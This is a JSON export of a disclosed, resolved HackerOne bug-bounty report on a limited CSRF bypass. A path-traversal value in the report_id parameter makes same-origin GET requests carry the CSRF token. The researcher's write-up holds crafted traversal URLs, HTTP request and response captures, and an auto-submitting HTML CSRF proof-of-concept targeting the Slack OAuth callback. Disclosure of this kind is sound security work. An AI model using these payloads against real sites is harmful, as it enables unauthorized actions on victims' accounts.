{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2015-12-02T05:25:36.698Z", 
    "voters": [
        "hussein98d", 
        "fantam1", 
        "japz", 
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 99708, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-12-02T04:48:45.310Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Limited CSRF bypass.", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-01-01T04:48:45.752Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-11-16T02:50:56.831Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-11-16T02:50:56.831Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi @harshafriend4all - I think I have followed all the steps in your report while trying to reproduce the behavior you describe, but the last step is failing for me because our OAuth2 handler detects an CSRF attempt. This is due to the `state` parameter being incorrect. Your PoC has the `state` parameter hardcoded. Did you also find a way to find a way to obtain the `state` parameter of your victim? If so, that would make this a lot more interesting and warrant an immediate fix. ", 
            "markdown_message": "<p>Hi <a href=\"/harshafriend4all\">@harshafriend4all</a> - I think I have followed all the steps in your report while trying to reproduce the behavior you describe, but the last step is failing for me because our OAuth2 handler detects an CSRF attempt. This is due to the <code>state</code> parameter being incorrect. Your PoC has the <code>state</code> parameter hardcoded. Did you also find a way to find a way to obtain the <code>state</code> parameter of your victim? If so, that would make this a lot more interesting and warrant an immediate fix. </p>\n", 
            "type": "Activities::Comment", 
            "id": 658984, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-11-16T05:34:50.137Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-11-16T05:34:50.137Z", 
            "actor": {
                "username": "defmax", 
                "url": "/defmax", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/759/93d015b135539e28d7a64adf30f0d991b18b2177_medium.jpg?1514634048"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Yeah I was not able to bypass state parameter validation of slack and I said this in description too . But there are 10+ integration I was thinking maybe any one would have partially state parameter validation . which would make this csrf possible. ", 
            "markdown_message": "<p>Yeah I was not able to bypass state parameter validation of slack and I said this in description too . But there are 10+ integration I was thinking maybe any one would have partially state parameter validation . which would make this csrf possible. </p>\n", 
            "type": "Activities::Comment", 
            "id": 659011, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-11-16T05:47:14.833Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-11-16T05:47:14.833Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thank you for confirming that @harshafriend4all. I can confirm that the other integrations are manual and do not support OAuth2, and thus would not be CSRF-able in the way you describe in this report. By manual, I mean our support staff has to manually configure this because no interface exists for it.\n\nI think we still want to add some additional validation like you suggest in your report. We'll get back to you on that soon.", 
            "markdown_message": "<p>Thank you for confirming that <a href=\"/harshafriend4all\">@harshafriend4all</a>. I can confirm that the other integrations are manual and do not support OAuth2, and thus would not be CSRF-able in the way you describe in this report. By manual, I mean our support staff has to manually configure this because no interface exists for it.</p>\n\n<p>I think we still want to add some additional validation like you suggest in your report. We&#39;ll get back to you on that soon.</p>\n", 
            "type": "Activities::Comment", 
            "id": 659018, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-11-16T16:02:31.315Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-11-16T16:02:31.315Z", 
            "actor": {
                "username": "mvgijssel", 
                "url": "/mvgijssel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/630/c0fd36c5bb75bd3d1b17c0c9ee1a16c5bde282e9_medium.jpg?1401267794"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 659639, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-11-27T16:10:00.599Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-11-27T16:10:00.599Z", 
            "actor": {
                "username": "martijn", 
                "url": "/martijn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/037/63c86d306b217f68ed4e6f1323fd08daf0001f01_medium.jpg?1447264787"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi @harshafriend4all \n\nWe deployed a fix for this issue. Can you confirm this has been fixed now?", 
            "markdown_message": "<p>Hi <a href=\"/harshafriend4all\">@harshafriend4all</a> </p>\n\n<p>We deployed a fix for this issue. Can you confirm this has been fixed now?</p>\n", 
            "type": "Activities::Comment", 
            "id": 700960, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-11-27T16:28:16.522Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-11-27T16:28:16.522Z", 
            "actor": {
                "username": "defmax", 
                "url": "/defmax", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/759/93d015b135539e28d7a64adf30f0d991b18b2177_medium.jpg?1514634048"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "GET https://hackerone.com/reports/1.458239753714584e+55.json 404 (Not Found)\n\nYup this has been fixed :)", 
            "markdown_message": "<p>GET <a title=\"https://hackerone.com/reports/1.458239753714584e+55.json\" href=\"https://hackerone.com/reports/1.458239753714584e+55.json\">https://hackerone.com/reports/1.458239753714584e+55.json</a> 404 (Not Found)</p>\n\n<p>Yup this has been fixed :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 700984, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "defmax", 
                "url": "/defmax"
            }, 
            "created_at": "2015-11-27T16:28:55.353Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-11-27T16:28:55.353Z", 
            "actor": {
                "username": "martijn", 
                "url": "/martijn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/037/63c86d306b217f68ed4e6f1323fd08daf0001f01_medium.jpg?1447264787"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Awesome, thanks! We'll get back to you about our bounty decision.", 
            "markdown_message": "<p>Awesome, thanks! We&#39;ll get back to you about our bounty decision.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 700985, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-12-02T04:48:37.423Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-12-02T04:48:37.423Z", 
            "actor": {
                "url": "/security", 
                "profile": {
                    "name": "HackerOne"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
                }
            }, 
            "team_handle": "security", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "defmax", 
                "url": "/defmax"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 705465, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-12-02T04:48:45.346Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-12-02T04:48:45.346Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 705466, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-12-02T05:25:36.738Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-12-02T05:25:36.738Z", 
            "actor": {
                "username": "defmax", 
                "url": "/defmax", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/759/93d015b135539e28d7a64adf30f0d991b18b2177_medium.jpg?1514634048"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks for the bounty :)", 
            "markdown_message": "<p>Thanks for the bounty :)</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 705496, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-12-02T05:25:37.197Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-12-02T05:25:37.197Z", 
            "actor": {
                "username": "defmax", 
                "url": "/defmax", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/759/93d015b135539e28d7a64adf30f0d991b18b2177_medium.jpg?1514634048"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 705497, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "defmax", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/defmax", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/759/856264b97da4c7fa2ff42a8abb69905686083a95_small.jpg?1514634048"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -92513353.92183754, 
    "disclosed_at": "2015-12-02T05:25:37.160Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/99708", 
    "created_at": "2015-11-14T19:45:05.651Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hello team </p>\n\n<p>I have found an very limited CSRF which could be valid for GET requests only. And the <code>Integrations</code> Tab is can be used in bypass </p>\n\n<h2 id=\"description\">Description :</h2>\n\n<p>Effected url :- <a title=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=0&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\" href=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=0&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\">https://hackerone.com/bugs?subject=anontest5667&amp;report_id=0&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1</a></p>\n\n<p>Effected parameter :- <code>Report_id</code> </p>\n\n<p>When you submit an report id it loads the json of the report. </p>\n\n<h6 id=\"request\">Request :-</h6>\n\n<p><a title=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=99698&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\" href=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=99698&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\">https://hackerone.com/bugs?subject=anontest5667&amp;report_id=99698&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1</a></p>\n\n<h6 id=\"response\">Response :-</h6>\n\n<p>XHR finished loading: GET &quot;<a title=\"https://hackerone.com/reports/99698.json\" href=\"https://hackerone.com/reports/99698.json\">https://hackerone.com/reports/99698.json</a>&quot;.</p>\n\n<p>When we add an ? at the end we get </p>\n\n<h6 id=\"request\">Request :-</h6>\n\n<p><a title=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=99698%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\" href=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=99698%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\">https://hackerone.com/bugs?subject=anontest5667&amp;report_id=99698%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1</a></p>\n\n<h6 id=\"response\">Response :-</h6>\n\n<p>XHR finished loading: GET &quot;<a title=\"https://hackerone.com/reports/99698?.json\" href=\"https://hackerone.com/reports/99698?.json\">https://hackerone.com/reports/99698?.json</a>&quot;.</p>\n\n<p>So i have added <code>../../../</code> to get out from reports dirs,</p>\n\n<h6 id=\"request\">Request :-</h6>\n\n<p><a title=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=..%2F..%2F..%2F99698%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\" href=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=..%2F..%2F..%2F99698%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\">https://hackerone.com/bugs?subject=anontest5667&amp;report_id=..%2F..%2F..%2F99698%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1</a></p>\n\n<h6 id=\"response\">Response :-</h6>\n<pre class=\"highlight plaintext\"><code>GET /99698?.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: hnDDTUm26xeV9lKMm8pnjsNsXKpMEtitUNMa2PeEFlUNiHLoO2J0lOxJpIYxmnXnbF1hNQMwUdB3e9MErdDktQ==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n\n</code></pre>\n<p>As you can see here we are out of reports folder and you can see CSRF token in header. So Now you can perform CSRF on get requests. so In a team there is a option for integration like slack. where we use oauth to Integrate. this is the only place where GET requests are performed. if we are able to bypass the state parameter validation we will be able to takeover the Team and in my theory I was only able to test slack and I was not able to bypass the validation, I have requested for other integrations ticket <a href=\"/reports/8741\">#8741</a>. so here is the theory </p>\n\n<h5 id=\"oauth-request\">oauth request :-</h5>\n\n<p><a title=\"https://slack.com/oauth/authorize?client_id=2174110321.11522100978&amp;redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback&amp;response_type=code&amp;scope=incoming-webhook&amp;state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2\" href=\"/redirect?signature=9d037febc2d28eb267c4b8f307cc193ec925d3e3&amp;url=https%3A%2F%2Fslack.com%2Foauth%2Fauthorize%3Fclient_id%3D2174110321.11522100978%26redirect_uri%3Dhttps%253A%252F%252Fhackerone.com%252Fauth%252Fslack%252Fcallback%26response_type%3Dcode%26scope%3Dincoming-webhook%26state%3Dc802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://slack.com/oauth/authorize?client_id=2174110321.11522100978&amp;redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback&amp;response_type=code&amp;scope=incoming-webhook&amp;state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2</span><i class=\"icon-external-link\"></i></a></p>\n\n<h5 id=\"response\">Response:</h5>\n\n<p><a title=\"https://hackerone.com/auth/slack/callback?code=%7BCODE%7D&amp;state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2\" href=\"/redirect?signature=eefd0eb3a96ed85508293a7506f27e5d64307430&amp;url=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback%3Fcode%3D%257BCODE%257D%26state%3Dc802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://hackerone.com/auth/slack/callback?code=%7BCODE%7D&amp;state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>So now lets try to use this in our CSRF url :- </p>\n\n<h6 id=\"request\">Request:</h6>\n\n<p><a title=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=..%2F..%2F..%2F/auth/slack/callback?code=14582397537.14583911921.010c282773&amp;state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\" href=\"https://hackerone.com/bugs?subject=anontest5667&amp;report_id=..%2F..%2F..%2F/auth/slack/callback?code=14582397537.14583911921.010c282773&amp;state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\">https://hackerone.com/bugs?subject=anontest5667&amp;report_id=..%2F..%2F..%2F/auth/slack/callback?code=14582397537.14583911921.010c282773&amp;state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2%3F&amp;view=new&amp;substates%5B%5D=new&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1</a></p>\n\n<h6 id=\"request-of-csrf\">Request of CSRF :-</h6>\n<pre class=\"highlight plaintext\"><code>GET //auth/slack/callback?code.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: BNkBdXZy5Yi14v1pV0PMwOXB8xfg+HuiBFE36dPJNraPIbDQBKZ6C8xdC2P9E96pSvDOiK/a8t8j+f41iZ3EVg==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n</code></pre>\n<h6 id=\"reponse\">Reponse :-</h6>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 302 Found\nServer: cloudflare-nginx\nDate: Sat, 14 Nov 2015 19:20:09 GMT\nContent-Type: text/plain; charset=utf-8\nContent-Length: 9\nConnection: keep-alive\nCache-Control: no-cache\nCf-Railgun: c8927a839b stream 0.000000 0231 5f99\nContent-Security-Policy: default-src &#39;none&#39;; connect-src &#39;self&#39;; font-src &#39;self&#39;; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src &#39;self&#39; data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;self&#39; https://www.google-analytics.com; style-src &#39;self&#39; &#39;unsafe-inline&#39;; base-uri &#39;self&#39;; form-action &#39;self&#39;; frame-ancestors &#39;none&#39;; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5&amp;sentry_key=b7f63dee2a404d5e83fff96c50bd700f\nLocation: /auth/failure?message=csrf_detected&amp;origin=https%3A%2F%2Fhackerone.com&amp;strategy=slack\n</code></pre>\n<p>You can see the CSRF has failed. So the problem was with .json at the end of the request. so it blocking our parameters to pass. so i have just url encoded everything and added a fake parameter to handle that json </p>\n\n<p>payload = <code>code=14582397537.14583819952.b7ff4c7e48&amp;state=9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55&amp;asd=</code></p>\n\n<p>Url encoded :- <code>code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D</code></p>\n\n<h6 id=\"request\">Request:-</h6>\n\n<p><a title=\"https://hackerone.com/bugs?subject=user&amp;report_id=../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&amp;view=open&amp;substates%5B%5D=new&amp;substates%5B%5D=needs-more-info&amp;substates%5B%5D=triaged&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\" href=\"https://hackerone.com/bugs?subject=user&amp;report_id=../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&amp;view=open&amp;substates%5B%5D=new&amp;substates%5B%5D=needs-more-info&amp;substates%5B%5D=triaged&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1\">https://hackerone.com/bugs?subject=user&amp;report_id=../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&amp;view=open&amp;substates%5B%5D=new&amp;substates%5B%5D=needs-more-info&amp;substates%5B%5D=triaged&amp;text_query=&amp;sort_type=latest_activity&amp;sort_direction=descending&amp;limit=25&amp;page=1</a></p>\n\n<h6 id=\"request-of-csrf\">Request of CSRF:-</h6>\n<pre class=\"highlight plaintext\"><code>GET /auth/slack/callback?code=14582397537.14583911921.010c282773&amp;state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2&amp;asd=.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: w3CpXrUUjtFVEWBdGu67hWO1drWIOLJn7dwzQj/cdoxIiBj7x8ARUiyullewvqnszIRLKscaOxrKdPqeZYiEbA==\nX-Requested-With: XMLHttpRequest\nReferer: https://hackerone.com\n\n</code></pre>\n<h6 id=\"response\">Response :-</h6>\n<pre class=\"highlight html\"><code>HTTP/1.1 302 Found\nServer: cloudflare-nginx\nDate: Sat, 14 Nov 2015 19:30:14 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 113\nConnection: keep-alive\nCache-Control: private, no-cache, no-store, must-revalidate\nCf-Railgun: 5d12521a91 stream 0.000000 0231 5f99\nContent-Disposition: inline; filename=&quot;response.html&quot;\nContent-Security-Policy: default-src &#39;none&#39;; connect-src &#39;self&#39;; font-src &#39;self&#39;; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src &#39;self&#39; data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;self&#39; https://www.google-analytics.com; style-src &#39;self&#39; &#39;unsafe-inline&#39;; base-uri &#39;self&#39;; form-action &#39;self&#39;; frame-ancestors &#39;none&#39;; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5<span class=\"err\">&amp;</span>sentry_key=b7f63dee2a404d5e83fff96c50bd700f\nLocation: https://hackerone.com/anontest5667/integrations\n\n<span class=\"nt\">&lt;html&gt;&lt;body&gt;</span>You are being <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://hackerone.com/anontest5667/integrations&quot;</span><span class=\"nt\">&gt;</span>redirected<span class=\"nt\">&lt;/a&gt;</span>.<span class=\"nt\">&lt;/body&gt;&lt;/html&gt;</span>\n</code></pre>\n<p>This 302 redirect is for the successfull integration. as i already said i wasnt able to bypass slack state parameter validation but  maybe other maybe vulnerable, I leave it on you to fix it or wont fix</p>\n\n<h5 id=\"html-code\">Html code:-</h5>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n    <span class=\"nt\">&lt;head&gt;</span>\n        <span class=\"nt\">&lt;title&gt;</span> CSRF Attack<span class=\"nt\">&lt;/title&gt;</span>\n    <span class=\"nt\">&lt;/head&gt;</span>\n\n    <span class=\"nt\">&lt;body</span> <span class=\"na\">onload=</span><span class=\"s\">&quot;document.createElement(&#39;form&#39;).submit.call(document.getElementById(&#39;myForm&#39;))&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;center&gt;&lt;h1&gt;</span>Integration add CSRF<span class=\"nt\">&lt;/h1&gt;&lt;/center&gt;</span>\n<span class=\"nt\">&lt;form</span> <span class=\"na\">id=</span><span class=\"s\">&quot;myForm&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;myForm&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;GET&quot;</span> <span class=\"na\">action=</span><span class=\"s\">&quot;https://hackerone.com/bugs&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;report_id&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&quot;</span><span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;center&gt;&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;submit&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;submit&quot;</span><span class=\"nt\">/&gt;&lt;/center&gt;</span>\n<span class=\"nt\">&lt;/form&gt;</span>\n\n\n    <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n\n</code></pre>\n<h5 id=\"remediation\">Remediation :</h5>\n\n<p>input validation should be done as if only integer is accepted like you do here <a title=\"https://hackerone.com/reports/asd\" href=\"https://hackerone.com/reports/asd\">https://hackerone.com/reports/asd</a></p>\n\n<p>Let me know if you need anything </p>\n\n<p>Regards<br>\n<em><strong>N B</strong></em></p>\n", 
    "vulnerability_information": "Hello team \n\nI have found an very limited CSRF which could be valid for GET requests only. And the `Integrations` Tab is can be used in bypass \n\n##Description :\n\nEffected url :- https://hackerone.com/bugs?subject=anontest5667&report_id=0&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n \nEffected parameter :- `Report_id` \n\nWhen you submit an report id it loads the json of the report. \n\n######Request :- \nhttps://hackerone.com/bugs?subject=anontest5667&report_id=99698&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n######Response :- \nXHR finished loading: GET \"https://hackerone.com/reports/99698.json\".\n\nWhen we add an ? at the end we get \n\n######Request :- \nhttps://hackerone.com/bugs?subject=anontest5667&report_id=99698%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n######Response :- \nXHR finished loading: GET \"https://hackerone.com/reports/99698?.json\".\n\nSo i have added `../../../` to get out from reports dirs,\n\n######Request :- \nhttps://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F99698%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1\n\n######Response :- \n```\nGET /99698?.json HTTP/1.1\nHost: hackerone.com\nUser-Agent: 